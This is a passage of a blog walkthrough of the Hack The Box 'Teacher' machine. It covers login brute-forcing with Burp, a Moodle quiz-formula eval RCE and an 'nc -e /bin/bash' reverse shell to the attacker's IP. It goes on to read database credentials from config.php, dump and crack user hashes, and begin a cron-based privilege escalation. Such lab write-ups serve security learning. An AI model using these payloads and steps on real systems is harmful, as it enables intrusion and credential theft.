<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HTB - Teacher Write-up | bigb0ss</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HTB - Teacher Write-up" /><meta name="author" content="bigb0ss" /><meta property="og:locale" content="en_US" /><meta name="description" content="This one was an easy difficulty box. Good learning path for: Login Brute-forcing Moodle RCE - Math Formular Abuse MySQL DB Enum to Extract Password Privilege Escalation via Cronjob" /><meta property="og:description" content="This one was an easy difficulty box. Good learning path for: Login Brute-forcing Moodle RCE - Math Formular Abuse MySQL DB Enum to Extract Password Privilege Escalation via Cronjob" /><link rel="canonical" href="https://bigb0sss.github.io/posts/htb-teacher-writeup/" /><meta property="og:url" content="https://bigb0sss.github.io/posts/htb-teacher-writeup/" /><meta property="og:site_name" content="bigb0ss" /><meta property="og:image" content="https://bigb0sss.github.io/assets/img/post/htb/teacher/01_infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-22T10:25:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://bigb0sss.github.io/assets/img/post/htb/teacher/01_infocard.png" /><meta property="twitter:title" content="HTB - Teacher Write-up" /><meta name="twitter:site" content="@bigb0ss___" /><meta name="twitter:creator" content="@bigb0ss" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"bigb0ss"},"description":"This one was an easy difficulty box. Good learning path for: Login Brute-forcing Moodle RCE - Math Formular Abuse MySQL DB Enum to Extract Password Privilege Escalation via Cronjob","@type":"BlogPosting","headline":"HTB - Teacher Write-up","dateModified":"2020-11-22T10:25:00-05:00","datePublished":"2020-11-22T10:25:00-05:00","url":"https://bigb0sss.github.io/posts/htb-teacher-writeup/","image":"https://bigb0sss.github.io/assets/img/post/htb/teacher/01_infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://bigb0sss.github.io/posts/htb-teacher-writeup/"},"@context":"https://schema.org"}</script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <script src="/assets/js/post.min.js" async></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-QE26N8SZTJ"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-QE26N8SZTJ'); </script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/bigb0ss/bigb0ss.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">bigb0ss</a></div><div class="site-subtitle font-italic">OSCE | OSCP | Security Blog</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.linkedin.com/in/danielsmin" target="_blank"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/bigb0sss" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/bigb0ss___" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HTB - Teacher Write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB - Teacher Write-up</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Nov 22, 2020" > Nov 22 <i class="unloaded">2020-11-22T10:25:00-05:00</i> </span> by <span class="author"> bigb0ss </span></div><div> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Nov 22, 2020" > Nov 22 <i class="unloaded">2020-11-22T23:36:03-05:00</i> </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/01_infocard.png" class="post-preview-img"><p>This one was an easy difficulty box. Good learning path for:</p><ul><li>Login Brute-forcing<li>Moodle RCE - Math Formular Abuse<li>MySQL DB Enum to Extract Password<li>Privilege Escalation via Cronjob</ul><h1 id="initial-recon">Initial Recon</h1><h2 id="nmap">Nmap</h2><p>Let’s begin with an initial port scan:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-Pn</span> <span class="nt">--open</span> <span class="nt">-p-</span> <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.10.153
<span class="go">
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blackhat highschool
</span></pre></table></code></div></div><h3 id="interesting-ports-to-note">Interesting Ports to Note</h3><ul><li>HTTP (80/TCP) - Web page for Blackhat High School.</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/02.png" alt="image" /></p><h2 id="image-enumeration">Image Enumeration</h2><p>Within the homepage, there was another <code class="language-plaintext highlighter-rouge">.html</code> page at <code class="language-plaintext highlighter-rouge">http://10.10.10.153/gallery.html</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/03.png" alt="image" /></p><p>When we inspect its source of the page, this seems interesting:</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"images/5.png"</span> <span class="na">onerror=</span><span class="s">"console.log('That\'s an F');"</span> <span class="na">alt=</span><span class="s">""</span><span class="nt">&gt;&lt;/a&gt;&lt;/li&gt;</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/04.png" alt="image" /></p><p>When we browse the image <code class="language-plaintext highlighter-rouge">5.png</code>, it errors out; however, using <code class="language-plaintext highlighter-rouge">Burp</code> we can get a partial password in plain-text: <code class="language-plaintext highlighter-rouge">Th4C00lTheacha</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/05.png" alt="image" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/06.png" alt="image" /></p><p>The user <code class="language-plaintext highlighter-rouge">Giovanni</code> is saying that she forgot the last character of her password. So the challenge may be that we need to find some type of login for the application and find the last character of ther password (probably bruteforcing the characters :]).</p><h2 id="web-directory-enumeration-gobuster">Web Directory Enumeration (gobuster)</h2><p>Next, we can enumerate the web application with <code class="language-plaintext highlighter-rouge">gobuster</code>. It found an interesting directory called <code class="language-plaintext highlighter-rouge">/moodle</code>.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.153/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-t</span> 30
<span class="go">
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.153/
[+] Threads:        30
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/22 21:16:33 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/manual (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/fonts (Status: 301)
/phpmyadmin (Status: 403)
/moodle (Status: 301)
</span></pre></table></code></div></div><p>It was <code class="language-plaintext highlighter-rouge">moodle</code> learning management system application. (https://moodle.org)</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/07.png" alt="image" /></p><h1 id="initial-foothold">Initial Foothold</h1><h2 id="moodle-teacher-app-login-bruteforce">Moodle (Teacher App) Login Bruteforce</h2><p>This app also has a login page. With the information we got it from the <code class="language-plaintext highlighter-rouge">5.png</code>, we can start bruteforce the last character of her (<code class="language-plaintext highlighter-rouge">Giovanni</code>) partial password.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/08.png" alt="image" /></p><p>We can capture the login with <code class="language-plaintext highlighter-rouge">Burp</code> and use the <code class="language-plaintext highlighter-rouge">Intruder</code> module to brutefoce the last character. We can use <code class="language-plaintext highlighter-rouge">a-z + A-Z + 0-9 + Special Chacters</code> for the bruteforce.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/09.png" alt="image" /></p><p><code class="language-plaintext highlighter-rouge">Burp</code> found the <code class="language-plaintext highlighter-rouge">Th4C00lTheacha#</code> combo for different response length. And that was the password for the <code class="language-plaintext highlighter-rouge">giovanni</code> user.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/10.png" alt="image" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/11.png" alt="image" /></p><h2 id="moodle-teacher-app-rce">Moodle (Teacher App) RCE</h2><p>Further Google search about this <code class="language-plaintext highlighter-rouge">moodle</code> application, we can find a public RCE exploit <a href="https://blog.ripstech.com/2018/moodle-remote-code-execution/">here</a>. Also <a href="https://www.youtube.com/watch?v=nXlOPoXW6NA">this video</a> will show you the step-by-step how to exploit it.</p><p>In a nutshell, an authenticated user (as assigned teacher role) can abuse the math formulas of the Quiz component to exectue RCE. It is possible because the function uses the PHP <code class="language-plaintext highlighter-rouge">eval()</code>, and it doesn’t sanitize the user input properly.</p><p>1) Go to <code class="language-plaintext highlighter-rouge">Site home</code> –&gt; Click <code class="language-plaintext highlighter-rouge">Algebra</code> –&gt; Click <code class="language-plaintext highlighter-rouge">Turn editting on</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/12.png" alt="image" /></p><p>2) Click <code class="language-plaintext highlighter-rouge">Add an activity or resource</code> –&gt; Click <code class="language-plaintext highlighter-rouge">Quiz</code> –&gt; <code class="language-plaintext highlighter-rouge">Add</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/13.png" alt="image" /></p><p>3) Create a new <code class="language-plaintext highlighter-rouge">Quiz</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/14.png" alt="image" /></p><p>4) Click on the new <code class="language-plaintext highlighter-rouge">Quiz</code> –&gt; Click <code class="language-plaintext highlighter-rouge">Edit</code> –&gt; Click <code class="language-plaintext highlighter-rouge">a new questions</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/15.png" alt="image" /></p><p>5) Click <code class="language-plaintext highlighter-rouge">Calculated</code> –&gt; Click <code class="language-plaintext highlighter-rouge">Add</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/16.png" alt="image" /></p><p>6) Using the POC code from the blog, let’s complete creating the new <code class="language-plaintext highlighter-rouge">Quiz</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/17.png" alt="image" /></p><p>This payload will execute a remote code using the parameter ‘bigb0ss=’. Using the following code, we can get a <code class="language-plaintext highlighter-rouge">nc</code> reverse shell onto our Kali box.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&amp;</span><span class="n">bigb0ss</span><span class="o">=</span><span class="p">(</span><span class="n">nc</span> <span class="o">-</span><span class="n">e</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span> <span class="mf">10.10.14.19</span> <span class="mi">9001</span><span class="p">)</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/18.png" alt="image" /></p><p>Let’s use the following one-liner to get a full <code class="language-plaintext highlighter-rouge">TTY</code> shell.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">python -c 'import pty;</span>pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'
</span><span class="go">
Ctrl+z

</span><span class="gp">$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">fg</span>
</pre></table></code></div></div><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="www-data--giovanni-mysql-db">www-data –&gt; giovanni (MySQL DB)</h2><p>Further enumeration found that <code class="language-plaintext highlighter-rouge">root</code> password for moodle DB.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="gp">www-data@teacher:/var/www/html/moodle$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> | <span class="nb">grep </span>config
<span class="go">-rw-r--r--  1 root root  45850 Jun 27  2018 config-dist.php.bak
-rw-r--r--  1 root root    728 Nov  3  2018 config.php
-rw-r--r--  1 root root    747 Nov  3  2018 config.php.save
</span><span class="gp">www-data@teacher:/var/www/html/moodle$</span><span class="w"> </span><span class="nb">cat </span>config.php
<span class="go">&lt;?php  // Moodle configuration file

</span><span class="gp">unset($</span>CFG<span class="o">)</span><span class="p">;</span>
<span class="gp">global $</span>CFG<span class="p">;</span>
<span class="gp">$</span>CFG <span class="o">=</span> new stdClass<span class="o">()</span><span class="p">;</span>
<span class="go">
</span><span class="gp">$</span>CFG-&gt;dbtype    <span class="o">=</span> <span class="s1">'mariadb'</span><span class="p">;</span>
<span class="gp">$</span>CFG-&gt;dblibrary <span class="o">=</span> <span class="s1">'native'</span><span class="p">;</span>
<span class="gp">$</span>CFG-&gt;dbhost    <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
<span class="gp">$</span>CFG-&gt;dbname    <span class="o">=</span> <span class="s1">'moodle'</span><span class="p">;</span>
<span class="gp">$</span>CFG-&gt;dbuser    <span class="o">=</span> <span class="s1">'root'</span><span class="p">;</span>
<span class="gp">$</span>CFG-&gt;dbpass    <span class="o">=</span> <span class="s1">'Welkom1!'</span><span class="p">;</span>
<span class="gp">$</span>CFG-&gt;prefix    <span class="o">=</span> <span class="s1">'mdl_'</span><span class="p">;</span>
<span class="gp">$</span>CFG-&gt;dboptions <span class="o">=</span> array <span class="o">(</span>
<span class="gp">  'dbpersist' =&gt;</span><span class="w"> </span>0,
<span class="gp">  'dbport' =&gt;</span><span class="w"> </span>3306,
<span class="gp">  'dbsocket' =&gt;</span><span class="w"> </span><span class="s1">''</span>,
<span class="gp">  'dbcollation' =&gt;</span><span class="w"> </span><span class="s1">'utf8mb4_unicode_ci'</span>,
<span class="gp">);</span><span class="w">
</span></pre></table></code></div></div><p>Let’s login to <code class="language-plaintext highlighter-rouge">mysql</code>:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="gp">www-data@teacher:/var/www/html/moodle$</span><span class="w"> </span>mysql <span class="nt">-h</span> localhost <span class="nt">-u</span> root <span class="nt">-p</span>
<span class="go">Enter password: 
</span><span class="gp">Welcome to the MariaDB monitor.  Commands end with ;</span><span class="w"> </span>or <span class="se">\g</span><span class="nb">.</span>
<span class="go">Your MariaDB connection id is 397
Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

</span><span class="gp">Type 'help;</span><span class="s1">' or '</span><span class="se">\h</span><span class="s1">' for help. Type '</span><span class="se">\c</span><span class="s1">' to clear the current input statement.
</span><span class="go">
</span><span class="gp">MariaDB [(none)]&gt;</span><span class="w"> </span>show databases<span class="p">;</span>
<span class="go">+--------------------+
| Database           |
+--------------------+
| information_schema |
| moodle             |
| mysql              |
| performance_schema |
| phpmyadmin         |
+--------------------+
5 rows in set (0.01 sec)
</span></pre></table></code></div></div><p>Then, within <code class="language-plaintext highlighter-rouge">moodle</code> database –&gt; <code class="language-plaintext highlighter-rouge">mdl_user</code> table, we can find MD5 password hash for <code class="language-plaintext highlighter-rouge">giovannibak</code>: <code class="language-plaintext highlighter-rouge">7a860966115182402ed06375cf0a22af</code>.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">MariaDB [moodle]&gt;</span><span class="w"> </span><span class="k">select </span>username, password from mdl_user<span class="p">;</span>
<span class="go">+-------------+--------------------------------------------------------------+
| username    | password                                                     |
+-------------+--------------------------------------------------------------+
</span><span class="gp">| guest       | $</span>2y<span class="nv">$10$ywuE5gDlAlaCu9R0w7pKW</span>.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
<span class="gp">| admin       | $</span>2y<span class="nv">$10$7VPsdU9</span>/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
<span class="gp">| giovanni    | $</span>2y<span class="nv">$10$38V6kI7LNudORa7lBAT0q</span>.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
<span class="go">| Giovannibak | 7a860966115182402ed06375cf0a22af                             |
+-------------+--------------------------------------------------------------+
4 rows in set (0.00 sec)
</span></pre></table></code></div></div><p>Using an online decryptor, we can recover the has in plain-text as <code class="language-plaintext highlighter-rouge">expelled</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/teacher/19.png" alt="image" /></p><p><b>user.txt</b></p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">www-data@teacher:/var/www/html/moodle$</span><span class="w"> </span>su <span class="nt">-l</span> giovanni
<span class="go">Password: 
</span><span class="gp">giovanni@teacher:~$</span><span class="w"> </span><span class="nb">id</span>    
<span class="go">uid=1000(giovanni) gid=1000(giovanni) groups=1000(giovanni)
</span><span class="gp">giovanni@teacher:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt 
<span class="go">fa9a ***REDACTED*** 8fa7
</span></pre></table></code></div></div><h2 id="giovanni--root-cronjob">giovanni –&gt; root (cronjob)</h2><p>Within the <code class="language-plaintext highlighter-rouge">gianvanni</code>’s home directory, there is a <code class="language-plaintext highlighter-rouge">/work</code> folder. We can see that <code class="language-plaintext highlighter-rouge">backup_course.tar.gz</code> is continuously being updated assuming there is some type of cronjob updating that file.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="gp">giovanni@teacher:~/work$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-lR</span>
<span class="go">.:
total 8
drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 courses
drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 tmp

./courses:
total 4
drwxr-xr-x 2 root root 4096 Jun 27  2018 algebra

./courses/algebra:
total 4
-rw-r--r-- 1 giovanni giovanni 109 Jun 27  2018 answersAlgebra

./tmp:
total 8
-rwxrwxrwx 1 root root  256 Nov 23 04:50 backup_courses.tar.gz    &lt;----
drwxrwxrwx 3 root root 4096 Jun 27  2018 courses

./tmp/courses:
total 4
drwxrwxrwx 2 root root 4096 Jun 27  2018 algebra

./tmp/courses/algebra:
total 4
-rwxrwxrwx 1 giovanni giovanni 109 Jun 27  2018 answersAlgebra
</span></pre></table></code></div></div><p>Backup script was found in the location at <code class="language-plaintext highlighter-rouge">/usr/bin/backup.sh</code>.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">giovanni@teacher:~/work/tmp$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> /usr/bin/backup.sh 
<span class="go">-rwxr-xr-x 1 root root 138 Jun 27  2018 /usr/bin/backup.sh
</span></pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>giovanni@teacher:~/work/tmp<span class="nv">$ </span><span class="nb">cat</span> /usr/bin/backup.sh 
<span class="c">#!/bin/bash</span>
<span class="nb">cd</span> /home/giovanni/work<span class="p">;</span>
<span class="nb">tar</span> <span class="nt">-czvf</span> tmp/backup_courses.tar.gz courses/<span class="k">*</span><span class="p">;</span>
<span class="nb">cd </span>tmp<span class="p">;</span>
<span class="nb">tar</span> <span class="nt">-xf</span> backup_courses.tar.gz<span class="p">;</span>
<span class="nb">chmod </span>777 <span class="k">*</span> <span class="nt">-R</span><span class="p">;</span>
</pre></table></code></div></div><p>Some <code class="language-plaintext highlighter-rouge">tar</code> helper here:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>-c: create a new archive
-z: filter the archive through gzip
-v: verbosely list files processed
-x: extract files from an archive
-f: use archive file or device ARCHIVE 
